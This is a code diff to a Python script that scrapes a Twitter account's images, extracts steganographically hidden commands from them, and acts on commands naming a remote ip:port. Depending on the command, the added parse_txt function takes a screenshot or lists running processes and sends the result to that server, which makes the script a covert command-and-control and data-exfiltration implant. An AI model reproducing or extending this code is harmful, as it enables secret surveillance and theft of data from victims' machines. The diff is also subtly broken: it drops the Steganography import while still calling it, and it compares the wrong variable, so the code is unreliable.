@@ -1,13 +1,11 @@
-from __future__ import absolute_import, unicode_literals
 from pathlib import Path
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions
-from steganography.steganography import Steganography
-import config
-import os,re,requests
 import chromedriver_binary
+import config,actions
+import os,re,requests
 
 USER = config.USER
 BASE_URL = config.BASE_URL
@@ -55,19 +53,32 @@ def extract_txt(dir_path):
         path = dir_path + os.path.basename(img)
         try:
             secret_text = Steganography.decode(path)
-            print(secret_text)
             return secret_text
         except:
             print("Failed to extract from: {}".format(path))
 
-def exec_txt(txt):
-    print(txt)
+def parse_txt(txt):
+    parsed = txt.split("/")
+    ip = parsed[0].split(":")[0]
+    port = int(parsed[0].split(":")[1])
+    action = parsed[1]
+    if (parsed == "screenshot"):
+        img = actions.screenshot()
+        actions.send_to_server(ip, port, img)
+    elif (parsed == "processes"):
+        procs = actions.processes()
+        actions.send_to_server(ip, port, procs)
+    else:
+        print("Parse error")
+        quit()
 
 def main():
     elements = get_twitter_elements(BASE_URL, USER)
     dl_tweet_img(elements, IMG_PATH)
     txt = extract_txt(IMG_PATH)
-    exec_txt(txt)
+    if txt is None:
+        raise ValueError("No text was found")
+    parse_txt(txt)
 
 if __name__ == "__main__":
     main()
